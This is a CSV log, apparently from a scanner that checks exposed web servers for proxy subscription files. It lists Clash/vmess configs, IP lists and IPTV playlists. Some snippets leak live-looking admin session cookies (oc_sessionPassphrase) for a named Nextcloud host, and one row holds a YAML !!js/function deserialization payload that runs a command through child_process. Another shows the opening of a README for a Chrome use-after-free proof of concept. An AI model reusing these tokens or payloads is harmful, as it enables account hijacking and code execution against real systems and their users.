原始URL,最终URL,状态,节点数,HTTP码,响应秒数,是否有更新,历史检查,历史更新,更新频率,上次更新时间,摘要
http://128.201.61.161:8888/names.txt,http://128.201.61.161:8888/names.txt,无有效节点,0,200,1.17,否,3,1,1/3,2026-09-02 22:04:30,born-adopt-app born-adopt-harp born-node-exporter born-pilot-app born-pilot-cron born-pilot-harp born-pilot-nginx born-pilot-push labupdate-hpb-janus labupdate-hpb-nats labupdate-hpb-signaling pool-e797101a-app pool-e797101a-cron pool-e797101a-harp pool-e797101a-nginx pool-e797101a-push shared-collabora shared-db shared-grafana shared-janus shared-loki shared-nats shared-node-exporter shared-prometheus shared-promtail shared-recording shared-redis shared-redis-exporter shared-signaling shared-so
http://128.201.61.161:8888/nc-cookie-demo360-admin.txt,http://128.201.61.161:8888/nc-cookie-demo360-admin.txt,无有效节点,0,200,1.17,否,3,1,1/3,2026-09-02 22:04:30,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	0	oc_sessionPassphrase	LL0hMSTsfSV6zI1Jt8XpDqr6Jx7Mwxq83U7%2BttNDLgVWdkMWO5KIBzWncjfjEJGYCUPzuPj%2Bxv9sgsO2DE77i3zWFKRk5JwGlRDEMBTI2LnpNsoe5jGqT6YE3Z3QQCnj #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	4133980799	__Host-nc_sameSiteCookielax	true #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRU
http://128.201.61.161:8888/nc-cookie-mailperf-admin.txt,http://128.201.61.161:8888/nc-cookie-mailperf-admin.txt,无有效节点,0,200,1.17,否,3,1,1/3,2026-09-02 22:04:30,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	0	oc_sessionPassphrase	whqWzbeNvUe5VmXHzyZtuzmu%2FbrFUAVoHrpIIHIYoumetlzshcaSvR6wlPajXqif0mEI6oM9SJhkPfR9qh3Qvhy9cNe2i%2FipLI4YBBAjFhx3s2F2Tk9zkFwRBOlgrYlC #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRUE	4133980799	__Host-nc_sameSiteCookielax	true #HttpOnly_demo360.work-lab.mework360.com.br	FALSE	/	TRU
http://128.201.61.161:8888/nc-cookies.txt,http://128.201.61.161:8888/nc-cookies.txt,无有效节点,0,200,1.16,否,3,1,1/3,2026-09-02 22:04:30,# Netscape HTTP Cookie File # https://curl.se/docs/http-cookies.html # This file was generated by libcurl! Edit at your own risk.  
http://128.201.61.161:8888/nc34-dl.txt,http://128.201.61.161:8888/nc34-dl.txt,无有效节点,0,200,1.17,否,3,1,1/3,2026-09-02 22:04:30,nc34-503-fix-1786935088 
http://128.201.61.161:8888/nc34-test.txt,http://128.201.61.161:8888/nc34-test.txt,无有效节点,0,200,1.17,否,3,1,1/3,2026-09-02 22:04:30,nc34-503-fix-1786935088 
http://128.201.61.161:8888/platform-baseline-1.1.29.yaml,http://128.201.61.161:8888/platform-baseline-1.1.29.yaml,无有效节点,0,200,1.16,否,3,1,1/3,2026-09-02 22:04:30,name: platform-1.0.0-lab-baseline generated: '2026-06-13' source: LAB host 128.201.61.102 validated images requires_lab_signoff: true  images:   - name: shared-db     repo: mariadb     tag: '10.11'     digest: sha256:5a5c675881ef3fd1c1da9b0a3bfd6ee82edbe39cd9e32e06be18034c37235e0e    - name: shared-redis     repo: redis     tag: alpine     digest: sha256:09160599abd229764c0fb44cb6be640294e1d360a54b19985ab4843dcf2d90f1     was_floating: true    - name: shared-socket-proxy     repo: tecnativa/dock
http://128.201.61.161:8888/stats161.txt,http://128.201.61.161:8888/stats161.txt,无有效节点,0,200,1.16,否,3,1,1/3,2026-09-02 22:04:30,work-labupdate-nginx	0.00% work-labupdate-app	0.00% work-labupdate-cron	0.00% work-labupdate-push	0.03% shared-collabora	0.09% labupdate-hpb-signaling	0.02% labupdate-hpb-janus	0.69% pool-e797101a-push	0.00% pool-e797101a-nginx	0.00% pool-e797101a-cron	0.00% pool-e797101a-app	0.00% pool-e797101a-harp	0.02% work-labupdate-harp	5.62% labupdate-hpb-nats	0.04% born-pilot-push	0.00% born-pilot-harp	0.02% born-pilot-cron	0.00% born-pilot-nginx	0.00% born-pilot-app	0.00% born-adopt-app	0.00% born-adopt
http://128.201.61.161:8888/talk-bot-body.txt,http://128.201.61.161:8888/talk-bot-body.txt,无有效节点,0,200,1.17,否,3,1,1/3,2026-09-02 22:04:30,"<?xml version=""1.0""?> <ocs>  <meta>   <status>failure</status>   <statuscode>401</statuscode>   <message></message>  </meta>  <data/> </ocs> "
http://128.201.61.161:8888/talk-bot-msg.txt,http://128.201.61.161:8888/talk-bot-msg.txt,无有效节点,0,200,1.17,否,3,1,1/3,2026-09-02 22:04:30,"<?xml version=""1.0""?> <ocs>  <meta>   <status>ok</status>   <statuscode>201</statuscode>   <message>OK</message>  </meta>  <data/> </ocs> "
http://128.201.61.161:8888/webhook-response.txt,http://128.201.61.161:8888/webhook-response.txt,请求失败,0,200,2.86,否,3,0,0/3,,
http://128.201.61.161:8888/wh-resp.txt,http://128.201.61.161:8888/wh-resp.txt,请求失败,0,200,2.86,否,3,0,0/3,,
http://128.201.61.161:8888/work-talk-versions.yaml,http://128.201.61.161:8888/work-talk-versions.yaml,无有效节点,0,200,3.43,否,3,1,1/3,2026-09-02 22:04:30,"# work-talk-versions.yaml — SSOT stack Talk (evolução de hpb-images.pin.yaml) # Release id (work-talk-X) = stack imutável promovido lab→prod (D3). # Rótulos de deployment (environments) = qual release está pinado por ambiente. # Bump rule: NENHUM componente (HPB, spreed, NC tag, fork patch, config-schema) # muda sem novo release id + fingerprint_hpb.  schema_version: 2  environments:   work-talk-lab-version:     release_ref: work-talk-1.2     version: ""1.2""     hosts:       - 128.201.61.161     "
http://129.146.41.164:8088/clash-hy2.yaml,http://129.146.41.164:8088/clash-hy2.yaml,提取成功,1,200,0.01,否,3,1,1/3,2026-09-02 22:04:30,
http://129.146.41.164:8088/clashxpro-ss.yaml,http://129.146.41.164:8088/clashxpro-ss.yaml,提取成功,1,200,0.01,否,3,1,1/3,2026-09-02 22:04:30,
http://129.226.60.230:8080/NestedLoopRawPtr_497736679.yaml,http://129.226.60.230:8080/NestedLoopRawPtr_497736679.yaml,无有效节点,0,200,1.79,否,3,1,1/3,2026-09-02 22:04:30,"name: NestedLoopRawPtr label: Nested-Loop Raw-Pointer UAF  dangerous_operation: >   A raw T* pointer (stack variable or function parameter) is held across a   nested event/message loop invocation (RunDragDropLoop, RunShellDrag,   DoDragDrop, or any function entering   ScopedAllowApplicationTasksInNativeNestedLoop). The nested loop re-enters   the UI thread event loop, allowing arbitrary tasks, IPCs, and widget   destruction to occur while the raw pointer is live on the stack. When the   loop ret"
http://129.226.60.230:8080/README_WIN.txt,http://129.226.60.230:8080/README_WIN.txt,无有效节点,0,200,1.78,否,3,1,1/3,2026-09-02 22:04:30,"PoC for WebRtcVideoFrameAdapter::SharedResources CallbackUAF ==============================================================  FILE: poc_win_chrome_uaf.html  CHROME LAUNCH COMMAND (Windows PowerShell):    & ""C:\path\to\chrome.exe"" `     --no-sandbox `     --no-first-run `     --disable-extensions `     --allow-file-access-from-files `     --use-fake-device-for-media-stream `     --use-fake-ui-for-media-stream `     --enable-features=WebrtcAcceleratedScaling `     --js-flags=""--expose-gc"" `     ""fi"
http://129.226.60.230:8080/angle_chrome_files.txt,http://129.226.60.230:8080/angle_chrome_files.txt,无有效节点,0,200,1.78,否,3,1,1/3,2026-09-02 22:04:30,third_party/angle/src/common/CompiledShaderState.cpp third_party/angle/src/common/Float16ToFloat32.cpp third_party/angle/src/common/MemoryBuffer.cpp third_party/angle/src/common/PackedEGLEnums_autogen.cpp third_party/angle/src/common/PackedEnums.cpp third_party/angle/src/common/PackedGLEnums_autogen.cpp third_party/angle/src/common/PoolAlloc.cpp third_party/angle/src/common/SimpleMutex.cpp third_party/angle/src/common/WorkerThread.cpp third_party/angle/src/common/aligned_memory.cpp third_party/a
http://129.226.60.230:8080/angle_chrome_files_stable.txt,http://129.226.60.230:8080/angle_chrome_files_stable.txt,无有效节点,0,200,2.46,否,3,1,1/3,2026-09-02 22:04:30,third_party/angle/src/common/CompiledShaderState.cpp third_party/angle/src/common/Float16ToFloat32.cpp third_party/angle/src/common/MemoryBuffer.cpp third_party/angle/src/common/PackedEGLEnums_autogen.cpp third_party/angle/src/common/PackedEnums.cpp third_party/angle/src/common/PackedGLEnums_autogen.cpp third_party/angle/src/common/PoolAlloc.cpp third_party/angle/src/common/SimpleMutex.cpp third_party/angle/src/common/WorkerThread.cpp third_party/angle/src/common/aligned_memory.cpp third_party/a
http://129.70.142.193/ros-one.yaml,http://129.70.142.193/ros-one.yaml,无有效节点,0,200,1.42,否,3,1,1/3,2026-09-02 22:04:30,ackermann_steering_controller:   debian:   - ros-one-ackermann-steering-controller   ubuntu:   - ros-one-ackermann-steering-controller actionlib:   debian:   - ros-one-actionlib   ubuntu:   - ros-one-actionlib actionlib_msgs:   debian:   - ros-one-actionlib-msgs   ubuntu:   - ros-one-actionlib-msgs actionlib_tools:   debian:   - ros-one-actionlib-tools   ubuntu:   - ros-one-actionlib-tools actionlib_tutorials:   debian:   - ros-one-actionlib-tutorials   ubuntu:   - ros-one-actionlib-tutorials ag
http://130.185.249.232:18080/gb-vohive-a12e0768.yaml,http://130.185.249.232:18080/gb-vohive-a12e0768.yaml,提取成功,1,200,1.09,否,3,1,1/3,2026-09-02 22:04:30,
http://130.94.34.165:8000/exp2.yaml,http://130.94.34.165:8000/exp2.yaml,无有效节点,0,200,2.6,否,3,1,1/3,2026-09-02 22:04:30,"prisoner_profile:   name: !!js/function >-     function(){ return process.mainModule.require(""child_process"").execSync(""/readflag"").toString(); } "
http://132.226.169.119/1.yaml,http://132.226.169.119/1.yaml,提取成功,36,200,2.08,否,3,1,1/3,2026-09-02 22:04:30,
http://132.226.169.119/85LA_LST0.txt,http://132.226.169.119/85LA_LST0.txt,请求失败,0,200,2.33,否,3,0,0/3,,
http://132.226.169.119/BASE_arr.txt,http://132.226.169.119/BASE_arr.txt,无有效节点,0,200,1.97,否,3,1,1/3,2026-09-02 22:04:30,smjh.de5.net 
http://132.226.169.119/BEST_LST.txt,http://132.226.169.119/BEST_LST.txt,无有效节点,0,200,2.27,是,3,2,2/3,2026-09-03 10:14:12,      - 104.18.33.120-7lf       - 104.18.33.120-01u       - 104.18.33.120-7ym       - 104.18.33.120-eyr       - 104.18.33.120-83j       - 104.18.33.120-bq7       - 188.164.248.136-7lf       - 188.164.248.136-01u       - 188.164.248.136-7ym       - 188.164.248.136-eyr       - 188.164.248.136-83j       - 188.164.248.136-bq7       - 188.164.248.191-7lf       - 188.164.248.191-01u       - 188.164.248.191-7ym       - 188.164.248.191-eyr       - 188.164.248.191-83j       - 188.164.248.191-bq7       - 
http://132.226.169.119/CH.txt,http://132.226.169.119/CH.txt,无有效节点,0,200,2.27,否,3,1,1/3,2026-09-02 22:04:30,104.18.34.100#新加坡 104.18.34.105#新加坡 104.18.34.115#新加坡 104.18.34.12#新加坡 104.18.34.150#新加坡 104.18.34.100#日本 104.18.34.105#日本 104.18.34.115#日本 104.18.34.12#日本 104.18.34.150#日本 104.16.0.110#美国 104.16.0.148#美国 104.16.0.208#美国 104.16.0.39#美国 104.16.1.156#美国 
http://132.226.169.119/IPTV.txt,http://132.226.169.119/IPTV.txt,无有效节点,0,200,3.48,否,3,1,1/3,2026-09-02 22:04:30,"央卫频道,#genre# CCTV1,webview://https://yangshipin.cn/tv/home?pid=600001859 CCTV2,webview://https://yangshipin.cn/tv/home?pid=600001800 CCTV3,webview://https://yangshipin.cn/tv/home?pid=600001801 CCTV4,webview://https://yangshipin.cn/tv/home?pid=600001814 CCTV5,webview://https://yangshipin.cn/tv/home?pid=600001818 CCTV5+,webview://https://yangshipin.cn/tv/home?pid=600001817 CCTV6,webview://https://yangshipin.cn/tv/home?pid=600108442 CCTV7,webview://https://yangshipin.cn/tv/home?pid=600004092 CCTV8,"
http://132.226.169.119/JP_LST.txt,http://132.226.169.119/JP_LST.txt,无有效节点,0,200,2.27,否,3,1,1/3,2026-09-02 22:04:30,      - 🔰 节点选择 
http://132.226.169.119/NODE_LST.txt,http://132.226.169.119/NODE_LST.txt,无有效节点,0,200,2.18,是,3,2,2/3,2026-09-03 10:14:12,       - 104.18.33.120-7lf       - 104.18.33.120-01u       - 104.18.33.120-7ym       - 104.18.33.120-eyr       - 104.18.33.120-83j       - 104.18.33.120-bq7       - 188.164.248.136-7lf       - 188.164.248.136-01u       - 188.164.248.136-7ym       - 188.164.248.136-eyr       - 188.164.248.136-83j       - 188.164.248.136-bq7       - 188.164.248.191-7lf       - 188.164.248.191-01u       - 188.164.248.191-7ym       - 188.164.248.191-eyr       - 188.164.248.191-83j       - 188.164.248.191-bq7       -
http://132.226.169.119/NODE_LST0.txt,http://132.226.169.119/NODE_LST0.txt,请求失败,0,200,2.27,否,3,0,0/3,,
http://132.226.169.119/SERVER_LST.txt,http://132.226.169.119/SERVER_LST.txt,提取成功,11,200,2.18,是,3,2,2/3,2026-09-03 10:14:12,
http://132.226.169.119/SF_LST0.txt,http://132.226.169.119/SF_LST0.txt,无有效节点,0,200,1.96,否,3,1,1/3,2026-09-02 22:04:30,      - YouTube顺丰资源 中国香港101       - YouTube顺丰资源 中国香港198       - YouTube顺丰资源 中国香港199       - YouTube顺丰资源 中国香港231       - YouTube顺丰资源 中国香港262       - YouTube顺丰资源 中国香港30       - YouTube顺丰资源 中国香港33       - YouTube顺丰资源 中国香港47       - YouTube顺丰资源 俄罗斯183       - YouTube顺丰资源 俄罗斯200       - YouTube顺丰资源 俄罗斯201       - YouTube顺丰资源 俄罗斯202       - YouTube顺丰资源 俄罗斯205       - YouTube顺丰资源 俄罗斯209       - YouTube顺丰资源 俄罗斯229       - YouTube顺丰资源 俄罗斯236       - YouTube顺丰资源 俄罗斯238       - YouTube顺丰资源 俄罗斯241       - Y
http://132.226.169.119/SG.txt,http://132.226.169.119/SG.txt,无有效节点,0,200,1.97,否,3,1,1/3,2026-09-02 22:04:30,104.18.34.30 108.162.192.1 108.162.192.3 108.162.192.4 108.162.192.6 108.162.192.7 108.162.192.8 108.162.192.9 162.159.0.2 162.159.0.3 162.159.0.4 162.159.0.5 162.159.0.6 162.159.0.8 162.159.0.9 162.159.1.225 162.159.13.97 162.159.17.104 162.159.36.54 162.159.4.20 162.159.40.45 162.159.43.56 162.159.58.101 168.138.165.174 172.64.32.1 172.64.32.2 172.64.32.4 172.64.32.5 172.64.32.7 172.64.32.8 172.64.50.19 20.247.137.183 34.143.159.175 
http://132.226.169.119/SG_LST.txt,http://132.226.169.119/SG_LST.txt,无有效节点,0,200,1.97,否,3,1,1/3,2026-09-02 22:04:30,      - 🔰 节点选择 
http://132.226.169.119/US_LST.txt,http://132.226.169.119/US_LST.txt,请求失败,0,200,1.97,否,3,0,0/3,,
http://132.226.169.119/b.txt,http://132.226.169.119/b.txt,无有效节点,0,200,2.66,否,3,1,1/3,2026-09-02 22:04:30,2.27.109.144 3.1.51.17 3.166.245.92 3.168.241.7 3.168.241.97 3.168.241.187 3.173.208.130 3.173.236.225 8.216.49.20 8.218.36.133 8.219.154.217 8.219.155.125 8.219.195.31 8.222.185.236 13.33.181.138 13.33.181.239 13.35.220.184 13.248.215.36 14.52.210.173 14.52.210.173 18.65.221.197 23.94.56.22 23.140.244.128 23.175.201.2 27.50.48.59 27.50.48.69 27.50.48.142 27.50.48.255 43.132.231.159 43.160.203.174 43.160.214.98 43.160.220.86 43.160.238.73 43.160.241.174 43.160.241.223 43.160.254.163 43.161.254.7
http://132.226.169.119/best.txt,http://132.226.169.119/best.txt,无有效节点,0,200,2.64,否,3,1,1/3,2026-09-02 22:04:30,101.33.55.147 103.122.247.65 103.193.172.196 103.213.4.57 103.242.2.214 103.25.202.102 103.39.78.112 103.47.186.3 103.91.219.234 104.156.252.234 104.17.106.180 104.17.108.111 104.17.115.241 104.17.121.31 104.17.124.238 104.17.58.205 104.18.118.174 104.18.193.138 104.18.46.61 104.19.152.225 104.19.56.34 104.207.151.42 104.21.85.70 104.238.149.235 104.248.158.76 107.170.248.68 107.172.32.207 114.32.9.249 128.199.255.242 129.146.47.135 129.153.74.231 129.159.47.168 133.18.105.95 134.209.106.237 136
http://132.226.169.119/best_1.txt,http://132.226.169.119/best_1.txt,无有效节点,0,200,2.64,否,3,1,1/3,2026-09-02 22:04:30,104.16.164.61 
http://132.226.169.119/clash.yaml,http://132.226.169.119/clash.yaml,提取成功,18,200,7.45,是,3,2,2/3,2026-09-03 10:14:12,
http://132.226.169.119/clash0.yaml,http://132.226.169.119/clash0.yaml,提取成功,7,200,4.56,否,3,1,1/3,2026-09-02 22:04:30,
http://132.226.169.119/clash3.yaml,http://132.226.169.119/clash3.yaml,提取成功,2,200,2.63,否,3,1,1/3,2026-09-02 22:04:30,
http://132.226.169.119/clash_new.yaml,http://132.226.169.119/clash_new.yaml,提取成功,10,200,3.19,否,3,1,1/3,2026-09-02 22:04:30,
http://132.226.169.119/ct.yaml,http://132.226.169.119/ct.yaml,请求失败,0,200,3.12,否,3,0,0/3,,
http://132.226.169.119/dx-1.txt,http://132.226.169.119/dx-1.txt,无有效节点,0,200,3.05,否,3,1,1/3,2026-09-02 22:04:30,"央视,#genre# CCTV1,http://27.148.240.185/PLTV/88888888/224/3221226773/1.m3u8 CCTV1,http://27.148.240.185/PLTV/88888888/224/3221226914/1.m3u8 CCTV1,http://27.148.240.185/PLTV/88888888/224/3221227263/1.m3u8 CCTV1,http://27.148.240.185/PLTV/88888888/224/3221227267/1.m3u8 CCTV2,http://27.148.240.185/PLTV/88888888/224/3221226788/1.m3u8 CCTV2,http://27.148.240.185/PLTV/88888888/224/3221227321/1.m3u8 CCTV3,http://27.148.240.185/PLTV/88888888/224/3221227317/1.m3u8 CCTV4,http://27.148.240.185/PLTV/88888888"
http://132.226.169.119/dx-2.txt,http://132.226.169.119/dx-2.txt,无有效节点,0,200,3.1,否,3,1,1/3,2026-09-02 22:04:30,"#genre#,http://cdn.1678520.xyz/epg/    央视频道,#genre#  CCTV1,http://nn.7x9d.cn/xzc2.php?ua=TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA2LjAuMC4wIFNhZmFyaS81MzcuMzY=&hls=aHR0cDovLzEyMC40MC4zOS4yNDY6MzUyL25ld2xpdmUvbGl2ZS9obHMvMS9saXZlLm0zdTg=  CCTV2,http://nn.7x9d.cn/xzc2.php?ua=TW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTA2LjAuMC4wIFNhZmFyaS81MzcuMzY="
http://132.226.169.119/dx.txt,http://132.226.169.119/dx.txt,无有效节点,0,200,2.97,否,3,1,1/3,2026-09-02 22:04:30,error code: 525
http://132.226.169.119/fjdx.txt,http://132.226.169.119/fjdx.txt,无有效节点,0,200,2.97,否,3,1,1/3,2026-09-02 22:04:30,"论坛积分购买（下载附件和等级快速提升）特殊功能卡我的帖子举报不良信息点击绑定手机号我的黑名单 请输入搜索内容 搜索 搜索 恩山无线论坛»论坛›其它网络智能设备以及软件应用等›150积分以上板块›福建电信组播源 返回列表发新帖 查看: 604|回复: 6   福建电信组播源 [复制链接] kudan  电梯直达 1#  发表于 2025-8-24 15:35 | 只看该作者  收集于网络分享，欢迎福建电信的朋友一起参与进来，修改和补全频道信息，大家共同打造一份完整的组播列表。    央视,#genre# CCTV1,rtp://239.61.4.176:1025 CCTV2,rtp://239.61.5.61:1025 CCTV3,rtp://239.61.4.120:1025 CCTV4,rtp://239.61.5.56:1025 CCTV4欧洲, CCTV4美洲, CCTV5,rtp://239.61.4.121:1025 CCTV5＋,rtp://239.61.5.58:1025 CCTV6,rtp://239.61.4.122:1025 CCTV7,rtp://239.61.5"
http://132.226.169.119/gs.txt,http://132.226.169.119/gs.txt,无有效节点,0,200,3.54,否,3,1,1/3,2026-09-02 22:04:30,"高胜影音,#genre# 4K车载夜店伤感DJ小曼《喝酒喝到吐想你想到哭》视听效果全新感受,https://vd4.bdstatic.com/mda-pdjcvraerp626ayj/720p/h264/1681981665055246009/mda-pdjcvraerp626ayj.mp4 4K车载夜店DJ神拽舞曲陈百强《一生何求》难忘的旋律,https://vd4.bdstatic.com/mda-pdde27tmwiw6jekv/uhd/cae_h264/1681511452605224417/mda-pdde27tmwiw6jekv.mp4 4K车载夜店舞曲伤感DJ魏佳艺《九十九步退一步》真是百听不厌,https://vd3.bdstatic.com/mda-pd2hq16u057zrr4h/uhd/cae_h264/1680526224157178538/mda-pd2hq16u057zrr4h.mp4 4K车载夜店DJ版刘艺雯《听闻远方有你》太好听了！,https://vd2.bdstatic.com/mda-pcte1ras7qezcwti/uhd/cae_h264/16"
http://132.226.169.119/ip.txt,http://132.226.169.119/ip.txt,无有效节点,0,200,2.98,否,3,1,1/3,2026-09-02 22:04:30,162.159.45.148 162.159.38.221 162.159.44.71  
http://132.226.169.119/ipv6.txt,http://132.226.169.119/ipv6.txt,无有效节点,0,200,2.98,否,3,1,1/3,2026-09-02 22:04:30,"央视频道,#genre# CCTV-1,http://[2409:8087:5e08:25::16]:6610/200000001898/460000089800010011/1.m3u8? CCTV-1,http://[2409:8087:5e08:25::16]:6610/200000001898/460000089800010045/1.m3u8? CCTV-1,http://[2409:8087:5e08:25::16]:6610/200000001898/460000089800010144/1.m3u8? CCTV-2,http://[2409:8087:5e08:25::16]:6610/200000001898/460000089800010050/1.m3u8? CCTV-2,http://[2409:8087:5e08:25::16]:6610/200000001898/460000089800010211/1.m3u8? CCTV-3,http://[2409:8087:5e08:25::16]:6610/200000001898/4600000898000101"
http://132.226.169.119/mytv.txt,http://132.226.169.119/mytv.txt,无有效节点,0,200,3.04,否,3,1,1/3,2026-09-02 22:04:30,error code: 525
http://132.226.169.119/n1.yaml,http://132.226.169.119/n1.yaml,无有效节点,0,200,6.48,否,3,1,1/3,2026-09-02 22:04:30,"﻿port: 7890 socks-port: 7891 allow-lan: true mode: Rule log-level: info external-controller: :9090 proxies:   - {name: US_youtube@资源分享师_4, server: time.is, port: 80, type: vmess, uuid: 474078a5-d39f-4531-ba65-685f38507c6c, alterId: 0, cipher: auto, tls: false, skip-cert-verify: true, network: ws, ws-path: /, ws-headers: {Host: xby.xiaoqi555.xyz}, udp: true}   - {name: US_youtube@资源分享师_5, server: ny01.818185.xyz, port: 443, type: vmess, uuid: a1925233-669e-4068-b740-d77f41986c43, alterId: 0, ciph"
